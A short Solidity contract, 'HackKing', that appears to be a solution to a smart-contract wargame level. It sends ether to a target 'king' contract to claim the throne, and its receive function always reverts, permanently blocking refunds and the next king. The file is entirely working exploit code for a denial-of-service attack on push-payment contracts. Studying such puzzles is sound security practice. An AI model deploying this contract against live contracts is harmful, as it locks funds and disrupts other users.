// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackKing {
  address public kingContract;

  constructor(address _kingContract) public payable {
    kingContract = _kingContract;
  }

  function crownMe() public payable {
    (bool success, bytes memory data) = kingContract.call.value(msg.value)("");
    require(success, "Transfer failed.");
  }

  receive() external payable {
    revert();

  }

}
